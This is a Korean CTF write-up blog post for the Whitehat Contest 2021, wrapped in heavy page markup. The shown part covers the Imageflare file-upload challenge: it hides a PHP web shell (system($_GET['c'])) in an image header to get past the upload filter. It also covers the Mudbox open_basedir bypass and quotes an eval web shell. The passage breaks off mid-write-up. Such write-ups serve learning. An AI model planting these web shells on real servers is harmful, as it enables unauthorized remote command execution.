<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en" data-mode="dark">
  <!-- The Head -->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  >

  

  

  
    <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.3" />
<meta property="og:title" content="Whitehat Contest 2021 Write Up" />
<meta property="og:locale" content="en" />
<meta name="description" content="This article is about write-up for the Whitehat Contest 2021. there is only three web and one pwn, misc challenges, all of which contain Time Based SQL Injection and RCE and bug" />
<meta property="og:description" content="This article is about write-up for the Whitehat Contest 2021. there is only three web and one pwn, misc challenges, all of which contain Time Based SQL Injection and RCE and bug" />
<link rel="canonical" href="http://localhost:4000/posts/WhiteHat-Contest/" />
<meta property="og:url" content="http://localhost:4000/posts/WhiteHat-Contest/" />
<meta property="og:site_name" content="Web2.0" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2021-09-13T08:29:53+09:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Whitehat Contest 2021 Write Up" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2021-09-13T08:29:53+09:00","datePublished":"2021-09-13T08:29:53+09:00","description":"This article is about write-up for the Whitehat Contest 2021. there is only three web and one pwn, misc challenges, all of which contain Time Based SQL Injection and RCE and bug","headline":"Whitehat Contest 2021 Write Up","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/WhiteHat-Contest/"},"url":"http://localhost:4000/posts/WhiteHat-Contest/"}</script>
<!-- End Jekyll SEO tag -->

  

  <title>Whitehat Contest 2021 Write Up | Web2.0
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<meta name="apple-mobile-web-app-title" content="Web2.0">
<meta name="application-name" content="Web2.0">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin>
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
    

    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">
  

  <!-- GA -->
  

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.2/css/all.min.css">


  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.21.3/dist/tocbot.min.css">
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
  

  
    <!-- Manific Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">
  

  <!-- JavaScript -->

  
  <style>
  hr {
    background:white;
    height:1px;
    border:0;
}
.core-app-profile--audithistory--auditwrapper {
	border: 1px solid #beb3c5;
    border: 1px solid var(--color__border-l1);
    border-radius: 4px;
    background-color: var(--color__bg-l1);
    display: flex;
    flex-direction: column;
    padding: 1rem;
    cursor: pointer
}

:root,:root.dark {
    --color__label-red: #ed2360;
    --color__label-yellow: #ffd330;
    --color__label-green: #17a05a;
    --color__label-blue: #2d20e2;
    --color__label-purple: #7549ff;
    --color__label-cyan: #18b4f8;
    --color__text-primary: #e6e6e6;
    --color__text-secondary: #adabb2;
    --color__text-tertiary: #8d8a99;
    --color__text-disabled: #6b6680;
    --color__text-yellow: #ffe878;
    --color__text-destructive: #ff6a8c;
    --color__text-primary-inv: #3f3c4f;
    --color__bg-l0: #1a1825;
    --color__bg-l1: #22202d;
    --color__bg-l2: #2e2b3b;
    --color__bg-l3: #3a3649;
    --color__bg-sidebar: #22202d;
    --color__bg-main: #1a1825;
    --color__bg-hover-l0: #1e1c2b;
    --color__bg-hover-l1: #272432;
    --color__bg-hover-l2: #332f41;
    --color__bg-l0-inv: #fff;
    --color__border-l0: #322f3f;
    --color__border-l1: #322f3f;
    --color__border-l2: #403c4d;
    --color__border-l3: #4f4c5f;
    --color__border-tertiary: rgba(208,204,255,.059);
    --color__overlay: #110f19;
    --font-size__header-xl: 1.625rem;
    --font-size__header-lg: 1.5rem;
    --font-size__header-md: 1.375rem;
    --font-size__header-sm: 1.25rem;
    --font-size__core-copy: 1.125rem;
    --font-size__lg: 1.063rem;
    --font-size__md: 0.938rem;
    --font-size__sm: 0.813rem;
    --color__alert-warning-text: #ebfcff;
    --color__alert-warning-text-secondary: #a1e6ff;
    --color__alert-warning-bg: #052947;
    --color__alert-warning-border: #085f96;
    --color__alert-error-text: #fff0f2;
    --color__alert-error-text-secondary: #ffcbd5;
    --color__alert-error-bg: #650126;
    --color__alert-error-border: #c70948
}
@media(prefers-reduced-motion:no-preference) {
    a {
        transition: color .2s ease-in-out
    }
}
.core-app-profile__bodybottom {
	width:100%;
	order:3;
	display:flex;
	flex-direction:column;
	gap:2rem
}

.profile--audithistory--loadmore {
	text-align:center
}
.profile--audithistory--loadmore hr {
	height:2px;
	background:#7549ff
}
.profile--audithistory--loadmore button {
	color:#fff;
	font-size:16px;
	width:max-content;
	margin:5px auto;
	display:flex;
	flex-direction:row;
	gap:5px;
	justify-content:center;
	align-items:center;
	cursor:pointer
}
.profile--audithistory--loadmore button svg {
	width:16px;
	height:16px
}
.profile--audithistory--loadmore button svg path {
	fill:#7549ff
}
.profile--audithistory--loadmore .audithistory--unavailable {
	margin-top:1rem;
	border:2px solid #2e2b3b;
	border-radius:.25rem;
	padding:1rem
}
.profile--audithistory--loadmore .audithistory--unavailable p {
	font-size:.875rem;
	line-height:1.125rem;
	text-align:start
}
.profile--audithistory--loadmore .audithistory--unavailable p strong {
	color:#fff
}
.profile--audithistory--auditsponsorimg {
	min-width:50px;
	min-height:50px;
	max-width:50px;
	max-height:50px;
	border-radius:50%
}
.profile--audithistory--auditheading {
	position:relative;
	display:flex;
	flex-direction:row;
	gap:14px;
	left:-15px;
	align-items:flex-end
}
.profile--audithistory--auditheading--date {
	font-size:14px;
	line-height:18px
}
.profile--audithistory--auditheading--title {
	font-size:20px;
	line-height:24px;
	color:#fff
}
.profile--audithistory--monthwrapper {
	margin-top:30px
}
.profile--audithistory--auditwrapper {
	position:relative;
	height:auto;
	margin:10px 0 30px 15px
}
.profile--audithistory--heading {
	display:flex;
	flex-direction:row;
	gap:10px;
	align-items:center;
	margin-bottom:25px
}
.profile--audithistory--heading p {
	font-size:18px;
	color:#fff;
	white-space:nowrap
}
.profile--audithistory--heading hr {
	border:1px solid #2e2b3b;
	width:100%;
	height:1px
}
.profile--auditseverity {
	position:relative
}
.profile--auditseverity--lineconnector {
	position:relative;
	left:9px;
	min-height:15px;
	width:.5px;
	background-color:#2e2b3b
}
.profile--auditseverity--lineconnector:last-of-type {
	position:absolute;
	bottom:0
}
.profile--auditseverity--ring {
	width:25px;
	height:25px;
	border-radius:50%;
	display:flex;
	align-items:center;
	justify-content:center;
	position:relative;
	left:-3px
}
.profile--auditseverity--ring--inner {
	border-radius:50%;
	width:5px;
	height:5px;
	background:#fff
}
.profile--auditseverity--severity {
	position:relative;
	display:flex;
	margin-left:45px;
	top:-24px
}
.profile--auditseverity--severity--heading {
	color:var(--color__text-primary)
}
.profile--auditseverity--severity--content {
	margin-left:8px
}
.profile--auditseverity--severity--content--flexwrapper {
	display:flex;
	column-gap:8px;
	row-gap:5px;
	align-items:center;
	flex-wrap:wrap;
	margin-bottom:5px
}
.profile--auditseverity--severity--decorator {
	min-width:4px;
	max-width:4px;
	height:auto
}
.profile--auditseverity--severity--locked {
	font-size:12px;
	display:flex;
	gap:5px;
	flex-direction:row;
	justify-content:flex-start;
	align-items:center
}
.profile--auditseverity--severity--title {
	color:#fff;
	font-weight:semibold;
	overflow-wrap:anywhere
}
.core-app-profile--audithistory--monthwrapper {
	margin-top:40px;
	display:flex;
	flex-direction:column;
	gap:1rem
}
.core-app-profile--audithistory--monthwrapper:first-child {
	margin-top:0
}
.core-app-profile--audithistory--heading {
	display:flex;
	flex-direction:row;
	gap:10px;
	align-items:center;
	justify-content:space-between;
	font-size:var(--font-size__header-md);
	color:var(--color__text-primary)
}
.core-app-profile--audithistory--auditwrapper {
	border: 1px solid #beb3c5;
	border-radius:4px;
	background-color:var(--color__bg-l1);
	display:flex;
	flex-direction:column;
	padding:1rem;
	cursor:pointer
}
.core-app-profile--audithistory--heading {
	display:flex;
	flex-direction:row;
	gap:10px;
	align-items:center;
	justify-content:space-between;
	font-size:var(--font-size__header-md);
	color:var(--color__text-primary)
}
.core-app-profile--audithistory--auditheading {
	position:relative;
	display:flex;
	flex-direction:row;
	gap:14px;
	align-items:center;
	justify-content:space-between
}
.core-app-profile--audithistory--content-wrapper {
	
	flex:1 1;
	position:relative;
	display:flex;
	flex-direction:column;
	gap:14px
}
@media(min-width:450px) {
	.core-app-profile--audithistory--content-wrapper {
		flex-direction:row;
		align-items:center;
		justify-content:space-between
	}
}
.core-app-profile--audithistory--header-wrapper {
	display:flex;
	flex-direction:row;
	gap:14px;
	align-items:center
}
.core-app-profile--audithistory--title {
	font-size:20px;
	line-height:24px;
	font-weight:700;
	color:var(--color__text-primary)
}
.core-app-profile--audithistory--date {
  text-overflow:ellipsis
	white-space:nowrap
}
.core-app-profile--audithistory--wrapper {
	display:flex;
	flex-direction:column-reverse;
	height:100%
}
  </style>

  <!-- A placeholder to allow defining custom metadata -->

  <script src="https://code4rena.com/_next/static/chunks/app/%5B@username%5D/page-20c23029062acd7f.js"></script>
</head>


  <body>
    <!-- The Side Bar -->

<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle">
      
        
        <img src="/assets/img/ant.jpg" width="112" height="112" alt="avatar" onerror="this.style.display='none'">
      
    </a>

    <h1 class="site-title">
      <a href="/">Web2.0</a>
    </h1>
    <p class="site-subtitle fst-italic mb-0">Amennnn</p>
  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>HOME</span>
        </a>
      </li>
      <li class="nav-item">
          <a href="https://evm.pics" class="nav-link">
            <i class="fa-fw fas fa-info-circle"></i><span>ABOUT</span>
          </a>
      </li>
      <!-- the real tabs -->
      
        <li class="nav-item">
          <a href="/archives/" class="nav-link">
            <i class="fa-fw fas fa-archive"></i>
            

            <span>ARCHIVES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    

    
      

      
        <a
          href="https://x.com/l0ptus"
          aria-label="x"
          

          

          

          
        >
          <i class="fab fa-twitter"></i>
        </a>
      
    
      

      
        <a
          href="https://blockscan.com/address/0xc39777E85d97a0B5655C62C6378F00D494feAce1"
          aria-label="wallet"
          

          

          

          
        >
          <i class="fab fa-ethereum"></i>
        </a>
      
    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" aria-label="Top Bar">
  <div
    style="background-color:#030014"
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">
                Home
              </a>
            </span>

          
        
          
        
          
            
              <span>Whitehat Contest 2021 Write Up</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      Post
    </div>

    <button type="button" id="search-trigger" class="btn btn-link">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="Search..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  <!-- CDN URL -->
  

  <!-- Add image path -->
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  

  
  

  

  
  

  

  
  

  




<!-- return -->




<article class="px-1">
  <header>
    <h1 data-toc-skip>Whitehat Contest 2021 Write Up</h1>

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1631489393"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Sep 13, 2021
</time>

      </span>

      <!-- lastmod date -->
      

      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          By

          <em>
            
              <a href="https://x.com/l0ptus">anonymous</a>
            
          </em>
        </span>

        <!-- read time -->
        <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="4889 words"
>
  <em>27 min</em> read</span>

      </div>
      <!-- .d-flex -->
    </div>
    <!-- .post-meta -->
  </header>

  <div class="content">
    <h1 id="web-imageflare-100-pts">(Web) Imageflare [100 pts]</h1>

<blockquote>
  <p>Imageflare 문제는 파일 업로드 취약점을 이용해 웹쉘을 업로드 한 뒤에 RCE를 이용해 플래그를 획득하는 문제입니다.</p>
</blockquote>

<p><a href="https://github.com/P0cas/ctf/blob/main/2021/White%20Hat%20Contest%202021/Imageflare/1.png?raw=true" class="popup img-link  shimmer"><img src="https://github.com/P0cas/ctf/blob/main/2021/White%20Hat%20Contest%202021/Imageflare/1.png?raw=true" alt="" loading="lazy"></a></p>

<p>일단 문제를 보면 위와 같이 파일 업로드 기능이 주어지고, 파일 업로드를 할 때 마다 Pow 값을 맞춰줘야 한다.</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">hashlib</span>
<span class="kn">import</span> <span class="n">string</span>
<span class="kn">import</span> <span class="n">random</span>
<span class="kn">import</span> <span class="n">uuid</span>
<span class="kn">import</span> <span class="n">sys</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">10000000</span><span class="p">)</span> <span class="p">:</span>
    <span class="nb">input</span> <span class="o">=</span> <span class="n">uuid</span><span class="p">.</span><span class="nf">uuid4</span><span class="p">()</span>
    <span class="nb">input</span> <span class="o">=</span> <span class="nf">str</span><span class="p">(</span><span class="nb">input</span><span class="p">)</span>
    <span class="n">sha_1</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="nf">sha1</span><span class="p">()</span>
    <span class="n">sha_1</span><span class="p">.</span><span class="nf">update</span><span class="p">(</span><span class="nb">input</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">))</span>
    <span class="n">inputsha</span> <span class="o">=</span> <span class="n">sha_1</span><span class="p">.</span><span class="nf">hexdigest</span><span class="p">()</span>
    <span class="n">inputsha5</span> <span class="o">=</span> <span class="n">inputsha</span><span class="p">[:</span><span class="mi">5</span><span class="p">]</span>
    <span class="nb">pow</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
    <span class="k">if</span> <span class="n">inputsha5</span> <span class="o">==</span> <span class="nb">pow</span> <span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[*] </span><span class="sh">"</span> <span class="o">+</span> <span class="nb">input</span><span class="p">)</span>
        <span class="k">break</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[*] end..</span><span class="sh">"</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Pow 값은 위 페이로드로 쉽게 획득할 수 있습니다.</p>

<p><a href="https://github.com/P0cas/ctf/blob/main/2021/White%20Hat%20Contest%202021/Imageflare/2.png?raw=true" class="popup img-link  shimmer"><img src="https://github.com/P0cas/ctf/blob/main/2021/White%20Hat%20Contest%202021/Imageflare/2.png?raw=true" alt="" loading="lazy"></a></p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?=</span> <span class="mi">7</span><span class="o">*</span><span class="mi">7</span> <span class="cp">?&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>php 파일을 업로드 해보니 필터링에 걸리는 것을 확인할 수 있었다. 그래서 여러번 파일 업로드를 하며 확인해본 결과 시그니처 값과 <code class="language-plaintext highlighter-rouge">&lt;?php &gt;</code> 문자열 존재만 확인하는 거 같았습니다. 그래서 그냥 아무 이미지 파일을 다운로드 하고, 이미지 헤더 내에 위 페이로드를 넣고, 파일 명은 <code class="language-plaintext highlighter-rouge">&lt;filename&gt;.php</code>로 업로드 하여 익스플로잇을 진행했습니다.</p>

<p>파일 업로드 후에 파일 명을 클릭하면 파일을 읽는 것이 아닌 다운로드가 되도록 구현되어 있었습니다. 여기서 저는 약간의 게싱을 이용해서 업로드 되는 디렉터리를 알아냈습니다. (/uploads/<filename>)</filename></p>

<p><a href="https://github.com/P0cas/ctf/blob/main/2021/White%20Hat%20Contest%202021/Imageflare/4.png?raw=true" class="popup img-link  shimmer"><img src="https://github.com/P0cas/ctf/blob/main/2021/White%20Hat%20Contest%202021/Imageflare/4.png?raw=true" alt="" loading="lazy"></a></p>

<p>아까 위에서 올린 php 파일로 접근을 해보니 <code class="language-plaintext highlighter-rouge">7*7</code>가 그대로 실행 되어 출력되는 것을 확인할 수 있었습니다.</p>

<p><a href="https://github.com/P0cas/ctf/blob/main/2021/White%20Hat%20Contest%202021/Imageflare/7.png?raw=true" class="popup img-link  shimmer"><img src="https://github.com/P0cas/ctf/blob/main/2021/White%20Hat%20Contest%202021/Imageflare/7.png?raw=true" alt="" loading="lazy"></a></p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?=</span> <span class="k">echo</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'c'</span><span class="p">]);</span> <span class="cp">?&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>이번에는 위와 같이 이미지 헤더 내에 웹쉘 페이로드를 넣은 후에 업로드하고, 쉘 명령어를 실행해보니 잘 되는 것을 볼 수 있었고, 이를 이용해 플래그를 획득했습니다.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>FLAG{ce9f5efd2c90c3f98fc61fcaf608f842}
</pre></td></tr></tbody></table></code></div></div>

<hr />
<h1 id="web-mudbox-290-pts">(Web) Mudbox [290 pts]</h1>

<blockquote>
  <p>Mudbox 문제는  session_save_path()를 이용한 open_basedir 우회 기법 또는 UAF Sandbox Escape를 이용해 open_basedir 옵션을 우회하고, RCE 하는 문제 입니다.</p>
</blockquote>

<p>저는 ini_set(), chdir() 함수로 ini_set() 함수로 open_basedir 옵션을 우회하려고 밤을 새면서 시도 했는데, ini_set()을 이용해서 open_basedir을 전역에서 설정해주어도 ㅈㄴ 설정이 아예 안 됐습니다. 하지만 저는 이 방법을 고집하고, 계속 시도 하였지만 php.ini 설정 때문인지 이년이 끝까지 말을 안 듣더라구요 :)</p>

<p>결국 대회 끝나고 지인들한테 물어보니 첫 번째는 <code class="language-plaintext highlighter-rouge">session_save_path()</code>를 이용해서  open_basedir 우회하기 위해 <code class="language-plaintext highlighter-rouge">plugin/</code> 디렉터리에 웹쉘 올리고, LFI를 이용해서 해당 파일을 실행 시키는 방식이고, 두 번째는 잘 알려진 UAF Sandbox Escape 공격을 하는 것 입니다.</p>

<p>저도 대회때 UAF 공격을 한 번 시도 해보긴 했는데, 파일 크기 때문에 UAF POC 파일을 업로드 하지 못 해서, 공격을 못 했는데, 지금 생각해보면 그냥 <code class="language-plaintext highlighter-rouge">&lt;?= eval($_GET['cmd']); ?&gt;</code>로 파일을 올리고, cmd 변수에 UAF Payload를 그냥 넘겨주면 됐었습니다.</p>

<p>또한 CCE 2020에서 nomorephp라는 문제와 싱크로율 100 ;; 그냥 ini_set()만 고집 안 했으면 풀었을 건데 아쉽네요.</p>

<p><a href="https://github.com/P0cas/ctf/blob/main/2021/White%20Hat%20Contest%202021/Mudbox/1.png?raw=true" class="popup img-link  shimmer"><img src="https://github.com/P0cas/ctf/blob/main/2021/White%20Hat%20Contest%202021/Mudbox/1.png?raw=true" alt="" loading="lazy"></a></p>

